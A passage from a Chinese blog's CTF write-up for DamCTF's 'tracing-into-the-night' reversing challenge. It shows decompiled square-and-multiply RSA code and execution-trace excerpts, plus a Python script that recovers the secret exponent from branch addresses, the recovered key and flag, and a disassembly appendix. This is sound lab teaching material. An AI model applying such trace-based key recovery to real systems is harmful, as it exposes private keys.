class="string">&quot;01593208120708529551321959949630329565423658895459815612132400107388877020500657132548424936286415877973588244076409&quot;</span></span><br><span class="line">    <span class="string">&quot;66168118534946988780352124447250486391602877115374749255917590522107130383257354161066774381783854733236051601578721&quot;</span></span><br><span class="line">    <span class="string">&quot;00921293042212211836183729677392992987773635562510585202428914012812566497860201863986256052255479138196297630309271&quot;</span></span><br><span class="line">    <span class="string">&quot;16797845975035799543683839219783896048175102837544478413783104917473648240255777477126155618892207667435904754185970&quot;</span></span><br><span class="line">    <span class="string">&quot;34124241987364543256876480363180951673554712287184795885954238526134182476977957020075710207967797122138761794542028&quot;</span></span><br><span class="line">    <span class="string">&quot;38904288156820819377922807485116093665788839281617306977143707941755642552793152090536335517622717864224098377424237&quot;</span></span><br><span class="line">    <span class="string">&quot;71079598091135349027890359740015253411564713414564272128678631947183569729406893947313967249940381200018159756340255&quot;</span></span><br><span class="line">    <span class="string">&quot;86570301765537327984403658958087369263542596635695098080079490219110960567217248626806197822943112103408691817283370&quot;</span></span><br><span class="line">    <span class="string">&quot;6720523324225354562780368660709612457907279718303360035550622133576978589&quot;</span>,</span><br><span class="line">    <span class="number">10L</span>L);</span><br><span class="line">  gmpz_set_str(&amp;mpz_t_input, &amp;input, <span class="number">10L</span>L);</span><br><span class="line">  v4 = (__int64 *)<span class="number">1</span>;</span><br><span class="line">  gmpz_init_set_ui(&amp;mpz_res, <span class="number">1L</span>L);</span><br><span class="line">  input_num = mpz_t_input.data;</span><br><span class="line">  <span class="keyword">for</span> ( i = HIDWORD(mpz_t_input.len) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">63</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      gmpz_mul(&amp;mpz_res, &amp;mpz_res, &amp;mpz_res);   <span class="comment">// r=r**2</span></span><br><span class="line">      v4 = &amp;mpz_res;</span><br><span class="line">      gmpz_mod(&amp;mpz_res, &amp;mpz_res, &amp;mpz_n);     <span class="comment">// r=r mod n</span></span><br><span class="line">      <span class="keyword">if</span> ( (input_num[i] &amp; <span class="number">0x8000000000000000</span>LL) == <span class="number">0x8000000000000000</span>LL )<span class="comment">// 取最高位</span></span><br><span class="line">      &#123;</span><br><span class="line">        gmpz_mul(&amp;mpz_res, &amp;mpz_res, &amp;mpz_t1);</span><br><span class="line">        v4 = &amp;mpz_res;</span><br><span class="line">        gmpz_mod(&amp;mpz_res, &amp;mpz_res, &amp;mpz_n);</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = <span class="number">2</span> * input_num[i];                    <span class="comment">// 左移1位</span></span><br><span class="line">      input_num[i] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = v20;</span><br><span class="line">  v6 = <span class="number">8</span> * HIDWORD(mpz_res);</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int64)<span class="string">&quot;&lt;&lt;&lt; &quot;</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;&lt;&lt; &quot;</span>, v4, v5);</span><br><span class="line">  <span class="keyword">for</span> ( k = v6 - <span class="number">1</span>; k &gt;= <span class="number">0</span>; --k )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*((<span class="keyword">char</span> *)v15 + k);</span><br><span class="line">    put_char(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = v10 ^ v22;</span><br><span class="line">  <span class="keyword">if</span> ( v10 != v22 )</span><br><span class="line">    result = sub_4010E0(v7, v9);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是一个平方求幂算法，这里算的是<br>$$<br>res=t1^{input}mod\ n<br>$$<br>是一个rsa算法，所以找到对应的解密密钥即可。</p>
<p>查看trace.asm文件，这里记录了程序执行过的指令。汇编中这两句值得注意。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">4013a6:       48 8b 00                mov    (%rax),%rax</span><br><span class="line">4013a9:       48 ba 00 00 00 00 00    movabs $0x8000000000000000,%rdx</span><br><span class="line">4013b3:       48 21 c2                and    %rax,%rdx</span><br><span class="line">4013b6:       48 b8 00 00 00 00 00    movabs $0x8000000000000000,%rax</span><br><span class="line">4013c0:       48 39 c2                cmp    %rax,%rdx</span><br><span class="line">4013c3:       75 40                   jne    401405 &lt;main+0x1cf&gt;</span><br><span class="line">401405:       8b 85 b0 f9 ff ff       mov    -0x650(%rbp),%eax</span><br><span class="line">40140b:       48 98                   cltq</span><br><span class="line">40140d:       48 8d 14 c5 00 00 00    lea    0x0(,%rax,8),%rdx</span><br></pre></td></tr></table></figure>

<p>即判断是否为相等，不相等就跳转，对应程序中的if语句。使用这个特征，根据jnz语句后面的语句地址，可以判断密钥的当前位是1还是0，使用python脚本解密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;trace.asm&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    nline = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> line:</span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">7</span>]==<span class="string">&#x27;4013c3:&#x27;</span>:</span><br><span class="line">            nline = f.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> nline:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> nline[:<span class="number">7</span>]==<span class="string">&#x27;401405:&#x27;</span>:</span><br><span class="line">                flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        line = f.readline()</span><br><span class="line">print(flag)</span><br><span class="line">print(int(flag,base=<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0011101111111000000101111111110110000010010100000100011010110100001010010101010100011010111011111111010010110001000011100110111101100000010010011101000110101011001000110110001010111010101101110010101100101100101111110000110100011100110110100000101111001011101001111001100011110000100001101101100110000010001100100001110110101010000110001100000110100100011101011000001110000011100111110111000100100110001011110011010000001101011111111010011011110101010101100011110001110100101000110111000000111011010010011110111010101011100000110101111011000111101100000011111000111010011010110101100111110000011010110110101101010001010001000000001010010001011000001100100111011100101101100001010100011101011111001011001100110001001001000001001011001111011101101011110011100110110010011001000010111010010001110100101100000100100101010111010010111100101000100101011001100011010111101001000011111110010110110000011100110001011000100011100101010001011001010110010110100011010000011000000100000111000000001111100111100111011000111111001101101101101101001110001011010101001111011001110100001001110001110100001000001100110101011110100011110111100011110101011110010000001110010001010111000001001100000101100010101101000110000001111001011011001001100100100010100000110100010101100110000100100110101110011000111001101001011010011011110001001100111100011100001011111010011010010101101110101011001000001000111110000100110011101010011000100110110001010100011101010101001001001011000111101011101110001010011000101110010001111101000110000101110100001101001011110001111010101110011101111100101011011001111000010011000010001010101000100011111111110110000111000001000011100011111010001000110100111111010011110111011011111100111001111011000100101001000110101100001101100010100110110111111101100011011101111000101101100010100010001100111010001000101101110111110100010010111000000111110110010010010110000101111001110111110111100000000110111100000000000011001110110100000101100111010010101111101111111111001101011100001011111001110011000100010000101111011100110001100111010011000110011110010111011111111001001111110101101100001111010101011110111110010011001011101001000101011110100100110000111101101100111111011001000011010000111111101101010011111001001100110010001111100100110100110000111101100111011001111000000001010101010100010101010010001001110001001000010100011110111110001100011101001110011010100001000000000110101000100100101010100010100001000101010111101111000010111001100110101001010010000111010100011000101110111111000110111001010100001001101011110001101101010011110010110011111010100011101001000100111101010101011010000101011101110100001111000010011101011101100011011100100000001011100011001010111101010010111101101010100000100000001100000001010101110110011001101001101010110111011011010011111000000010101001100100010101111101000011000110011000011111000001100100010011001000110001010000010111111110100001010011101111110010110101111101100000111011101001011000001001100110011000110111000010000110001101011101100001001001100110001000000010010110010100111100011000011111111011111101100011010111010010100111000000010110001000101001100011010011000101011010000000101100001000010101111101000110011111010100010010100000000101001100001101010110100111010000000101011100000111001000000010010101100101011100110100111010110101110010100001100010110001011001011001100101101001000011101000111001100100000000100001000111010110001011110101001101100001110111101001000100110100110011100100000000001010000101011001110010110100110110001000111001110000110001010101000111100100101110101000111011001010100000001100001001000010110111101010100001000101011110000101110101111000000101010101000111011111110001100101011110000001110110101111111000001011101010101111010000100010000011101111001101000110110111010101111110100100011101011101010001101100000010101010000111110010001011101100001101010010001101110010101100001101111101011001110000001010111101010110101000011001100111110011011100011111101001011100001001110001101011100011011111101001001111100111010101111010010101001111111110110101111010101110111011101101110100001000010010011000011101101011001001</span><br><span class="line">244652648608644057289603953074612700175933964244789320848667909167563692702652547784242339814218808951063055612658793570186844889979282952606878226608877859935559988556621623278752812292605612612163883997532869509885618332866441068962865470136130272926263303521750180711550883814600026677234330838029265221441047841355637850083056067511836089295432603059046109298537904428654107114553910703320935211803599935665225999452564664140186232164739291375407556107412707105250411308366447742913058979723684840765449422267902293487537073300912104264330520400754843332881465525532116517816288168335852096828051764240859454454009518120111671812902113201938369763608841769720763131720010223805776325980208111929662026610968279056747490265115993253416851071451892127738460444147514901971784385322720069737101076139227245987315223123169336706863690888801293487213146614146679028050257150777887496982927824949105219206894794372697828812226397922441686397417061966543488748591869285400239357533529688996471390996874988047597260063994210684092801510867133594884893681119353051040329814500624965262408435785310992711659906711739870502390260550767314380870394028475183756688989994399612240550769839124489086507436798682013488698499282429664122768579273</span><br></pre></td></tr></table></figure>

<p>输入得到flag</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Downloads$ ./tracing-into-the-night </span><br><span class="line">&gt;&gt;&gt; 244652648608644057289603953074612700175933964244789320848667909167563692702652547784242339814218808951063055612658793570186844889979282952606878226608877859935559988556621623278752812292605612612163883997532869509885618332866441068962865470136130272926263303521750180711550883814600026677234330838029265221441047841355637850083056067511836089295432603059046109298537904428654107114553910703320935211803599935665225999452564664140186232164739291375407556107412707105250411308366447742913058979723684840765449422267902293487537073300912104264330520400754843332881465525532116517816288168335852096828051764240859454454009518120111671812902113201938369763608841769720763131720010223805776325980208111929662026610968279056747490265115993253416851071451892127738460444147514901971784385322720069737101076139227245987315223123169336706863690888801293487213146614146679028050257150777887496982927824949105219206894794372697828812226397922441686397417061966543488748591869285400239357533529688996471390996874988047597260063994210684092801510867133594884893681119353051040329814500624965262408435785310992711659906711739870502390260550767314380870394028475183756688989994399612240550769839124489086507436798682013488698499282429664122768579273</span><br><span class="line">&lt;&lt;&lt; dam&#123;and_1nto_d4ta_depend3ncy&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E6%96%B9%E6%B1%82%E5%B9%82">平方求幂–wikipedia</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/24135">DamCTF rev/tracing-into-the-night wp by macz–ctftime</a></p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>平方求幂算法汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401236 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401236                 public main</span><br><span class="line">.text:0000000000401236 main            proc near               ; DATA XREF: _start+21↑o</span><br><span class="line">.text:0000000000401236 ; __unwind &#123;</span><br><span class="line">.text:0000000000401236                 endbr64</span><br><span class="line">.text:000000000040123A                 push    rbp</span><br><span class="line">.text:000000000040123B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040123E                 sub     rsp, 650h</span><br><span class="line">.text:0000000000401245                 mov     rax, fs:28h</span><br><span class="line">.text:000000000040124E                 mov     [rbp-8], rax</span><br><span class="line">.text:0000000000401252                 xor     eax, eax</span><br><span class="line">.text:0000000000401254                 lea     rdi, asc_4029E0 ; &quot;&gt;&gt;&gt; &quot;</span><br><span class="line">.text:000000000040125B                 mov     eax, 0</span><br><span class="line">.text:0000000000401260                 call    puts</span><br><span class="line">.text:0000000000401265                 lea     rax, [rbp-5F0h]</span><br><span class="line">.text:000000000040126C                 mov     rsi, rax</span><br><span class="line">.text:000000000040126F                 lea     rdi, a1499s     ; &quot;%1499s&quot;</span><br><span class="line">.text:0000000000401276                 mov     eax, 0</span><br><span class="line">.text:000000000040127B                 call    scanf</span><br><span class="line">.text:0000000000401280                 lea     rdx, [rbp-610h]</span><br><span class="line">.text:0000000000401287                 lea     rsi, [rbp-620h]</span><br><span class="line">.text:000000000040128E                 lea     rax, [rbp-630h]</span><br><span class="line">.text:0000000000401295                 mov     ecx, 0</span><br><span class="line">.text:000000000040129A                 mov     rdi, rax</span><br><span class="line">.text:000000000040129D                 mov     eax, 0</span><br><span class="line">.text:00000000004012A2                 call    gmpz_inits</span><br><span class="line">.text:00000000004012A7                 lea     rax, [rbp-630h]</span><br><span class="line">.text:00000000004012AE                 mov     edx, 0Ah</span><br><span class="line">.text:00000000004012B3                 lea     rsi, N          ; &quot;447184510719975054597372033820970367631&quot;...</span><br><span class="line">.text:00000000004012BA                 mov     rdi, rax</span><br><span class="line">.text:00000000004012BD                 call    gmpz_set_str</span><br><span class="line">.text:00000000004012C2                 lea     rax, [rbp-620h]</span><br><span class="line">.text:00000000004012C9                 mov     edx, 0Ah</span><br><span class="line">.text:00000000004012CE                 lea     rsi, C          ; &quot;206194863148973418443184998011923777934&quot;...</span><br><span class="line">.text:00000000004012D5                 mov     rdi, rax</span><br><span class="line">.text:00000000004012D8                 call    gmpz_set_str</span><br><span class="line">.text:00000000004012DD                 lea     rcx, [rbp-5F0h]</span><br><span class="line">.text:00000000004012E4                 lea     rax, [rbp-610h]</span><br><span class="line">.text:00000000004012EB                 mov     edx, 0Ah</span><br><span class="line">.text:00000000004012F0                 mov     rsi, rcx</span><br><span class="line">.text:00000000004012F3                 mov     rdi, rax</span><br><span class="line">.text:00000000004012F6                 call    gmpz_set_str</span><br><span class="line">.text:00000000004012FB                 lea     rax, [rbp-600h]</span><br><span class="line">.text:0000000000401302                 mov     esi, 1</span><br><span class="line">.text:0000000000401307                 mov     rdi, rax</span><br><span class="line">.text:000000000040130A                 call    gmpz_init_set_ui</span><br><span class="line">.text:000000000040130F                 mov     rax, [rbp-608h]</span><br><span class="line">.text:0000000000401316                 mov     [rbp-640h], rax</span><br><span class="line">.text:000000000040131D                 mov     eax, [rbp-60Ch]</span><br><span class="line">.text:0000000000401323                 mov     [rbp-644h], eax</span><br><span class="line">.text:0000000000401329                 mov     eax, [rbp-644h]</span><br><span class="line">.text:000000000040132F                 sub     eax, 1</span><br><span class="line">.text:0000000000401332                 mov     [rbp-650h], eax</span><br><span class="line">.text:0000000000401338                 jmp     loc_40145D</span><br><span class="line">.text:000000000040133D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040133D</span><br><span class="line">.text:000000000040133D loc_40133D:                             ; CODE XREF: main+22E↓j</span><br><span class="line">.text:000000000040133D                 mov     dword ptr [rbp-64Ch], 0</span><br><span class="line">.text:0000000000401347                 jmp     loc_401449</span><br><span class="line">.text:000000000040134C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040134C</span><br><span class="line">.text:000000000040134C loc_40134C:                             ; CODE XREF: main+21A↓j</span><br><span class="line">.text:000000000040134C                 lea     rdx, [rbp-600h]</span><br><span class="line">.text:0000000000401353                 lea     rcx, [rbp-600h]</span><br><span class="line">.text:000000000040135A                 lea     rax, [rbp-600h]</span><br><span class="line">.text:0000000000401361                 mov     rsi, rcx</span><br><span class="line">.text:0000000000401364                 mov     rdi, rax</span><br><span class="line">.text:0000000000401367                 call    gmpz_mul</span><br><span class="line">.text:000000000040136C                 lea     rdx, [rbp-630h]</span><br><span class="line">.text:0000000000401373                 lea     rcx, [rbp-600h]</span><br><span class="line">.text:000000000040137A                 lea     rax, [rbp-600h]</span><br><span class="line">.text:0000000000401381                 mov     rsi, rcx</span><br><span class="line">.text:0000000000401384                 mov     rdi, rax</span><br><span class="line">.text:0000000000401387                 call    gmpz_mod</span><br><span class="line">.text:000000000040138C                 mov     eax, [rbp-650h]</span><br><span class="line">.text:0000000000401392                 cdqe</span><br><span class="line">.text:0000000000401394                 lea     rdx, ds:0[rax*8]</span><br><span class="line">.text:000000000040139C                 mov     rax, [rbp-640h]</span><br><span class="line">.text:00000000004013A3                 add     rax, rdx</span><br><span class="line">.text:00000000004013A6                 mov     rax, [rax]</span><br><span class="line">.text:00000000004013A9                 mov     rdx, 8000000000000000h</span><br><span class="line">.text:00000000004013B3                 and     rdx, rax</span><br><span class="line">.text:00000000004013B6                 mov     rax, 8000000000000000h</span><br><span class="line">.text:00000000004013C0                 cmp     rdx, rax</span><br><span class="line">.text:00000000004013C3                 jnz     short loc_401405</span><br><span class="line">.text:00000000004013C5                 lea     rdx, [rbp-620h]</span><br><span class="line">.text:00000000004013CC                 lea     rcx, [rbp-600h]</span><br><span class="line">.text:00000000004013D3                 lea     rax, [rbp-600h]</span><br><span class="line">.text:00000000004013DA                 mov     rsi, rcx</span><br><span class="line">.text:00000000004013DD                 mov     rdi, rax</span><br><span class="line">.text:00000000004013E0                 call    gmpz_mul</span><br><span class="line">.text:00000000004013E5                 lea     rdx, [rbp-630h]</span><br><span class="line">.text:00000000004013EC                 lea     rcx, [rbp-600h]</span><br><span class="line">.text:00000000004013F3                 lea     rax, [rbp-600h]</span><br><span class="line">.text:00000000004013FA                 mov     rsi, rcx</span><br><span class="line">.text:00000000004013FD                 mov     rdi, rax</span><br><span class="line">.text:0000000000401400                 call    gmpz_mod</span><br><span class="line">.text:0000000000401405</span><br><span class="line">.text:0000000000401405 loc_401405:                             ; CODE XREF: main+18D↑j</span><br><span class="line">.text:0000000000401405                 mov     eax, [rbp-650h]</span><br><span class="line">.text:000000000040140B                 cdqe</span><br><span class="line">.text:000000000040140D                 lea     rdx, ds:0[rax*8]</span><br><span class="line">.text:0000000000401415                 mov     rax, [rbp-640h]</span><br><span class="line">.text:000000000040141C                 add     rax, rdx</span><br><span class="line">.text:000000000040141F                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000401422                 mov     eax, [rbp-650h]</span><br><span class="line">.text:0000000000401428                 cdqe</span><br><span class="line">.text:000000000040142A                 lea     rcx, ds:0[rax*8]</span><br><span class="line">.text:0000000000401432                 mov     rax, [rbp-640h]</span><br><span class="line">.text:0000000000401439                 add     rax, rcx</span><br><span class="line">.text:000000000040143C                 add     rdx, rdx</span><br><span class="line">.text:000000000040143F                 mov     [rax], rdx</span><br><span class="line">.text:0000000000401442                 add     dword ptr [rbp-64Ch], 1</span><br><span class="line">.text:0000000000401449</span><br><span class="line">.text:0000000000401449 loc_401449:                             ; CODE XREF: main+111↑j</span><br><span class="line">.text:0000000000401449                 cmp     dword ptr [rbp-64Ch], 3Fh</span><br><span class="line">.text:0000000000401450                 jle     loc_40134C</span><br><span class="line">.text:0000000000401456                 sub     dword ptr [rbp-650h], 1</span><br><span class="line">.text:000000000040145D</span><br><span class="line">.text:000000000040145D loc_40145D:                             ; CODE XREF: main+102↑j</span><br><span class="line">.text:000000000040145D                 cmp     dword ptr [rbp-650h], 0</span><br><span class="line">.text:0000000000401464                 jns     loc_40133D</span><br><span class="line">.text:000000000040146A                 mov     rax, [rbp-5F8h]</span><br><span class="line">.text:0000000000401471                 mov     [rbp-638h], rax</span><br><span class="line">.text:0000000000401478                 mov     eax, [rbp-5FCh]</span><br><span class="line">.text:000000000040147E                 shl     eax, 3</span><br><span class="line">.text:0000000000401481                 mov     [rbp-644h], eax</span><br><span class="line">.text:0000000000401487                 lea     rdi, asc_4029EC ; &quot;&lt;&lt;&lt; &quot;</span><br><span class="line">.text:000000000040148E                 mov     eax, 0</span><br><span class="line">.text:0000000000401493                 call    puts</span><br><span class="line">.text:0000000000401498                 mov     eax, [rbp-644h]</span><br><span class="line">.text:000000000040149E                 sub     eax, 1</span><br><span class="line">.text:00000000004014A1                 mov     [rbp-648h], eax</span><br><span class="line">.text:00000000004014A7                 jmp     short loc_4014D0</span><br><span class="line">.text:00000000004014A9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004014A9</span><br><span class="line">.text:00000000004014A9 loc_4014A9:                             ; CODE XREF: main+2A1↓j</span><br><span class="line">.text:00000000004014A9                 mov     eax, [rbp-648h]</span><br><span class="line">.text:00000000004014AF                 movsxd  rdx, eax</span><br><span class="line">.text:00000000004014B2                 mov     rax, [rbp-638h]</span><br><span class="line">.text:00000000004014B9                 add     rax, rdx</span><br><span class="line">.text:00000000004014BC                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:00000000004014BF                 movsx   eax, al</span><br><span class="line">.text:00000000004014C2                 mov     edi, eax</span><br><span class="line">.text:00000000004014C4                 call    put_char</span><br><span class="line">.text:00000000004014C9                 sub     dword ptr [rbp-648h], 1</span><br><span class="line">.text:00000000004014D0</span><br><span class="line">.text:00000000004014D0 loc_4014D0:                             ; CODE XREF: main+271↑j</span><br><span class="line">.text:00000000004014D0                 cmp     dword ptr [rbp-648h], 0</span><br><span class="line">.text:00000000004014D7                 jns     short loc_4014A9</span><br><span class="line">.text:00000000004014D9                 mov     eax, 0</span><br><span class="line">.text:00000000004014DE                 mov     rsi, [rbp-8]</span><br><span class="line">.text:00000000004014E2                 xor     rsi, fs:28h</span><br><span class="line">.text:00000000004014EB                 jz      short locret_4014F2</span><br><span class="line">.text:00000000004014ED                 call    sub_4010E0</span><br><span class="line">.text:00000000004014F2</span><br><span class="line">.text:00000000004014F2 locret_4014F2:                          ; CODE XREF: main+2B5↑j</span><br><span class="line">.text:00000000004014F2                 leave</span><br><span class="line">.text:00000000004014F3                 retn</span><br><span class="line">.text:00000000004014F3 ; &#125; &#x2F;&#x2F; starts at 401236</span><br><span class="line">.text:00000000004014F3 main            endp</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>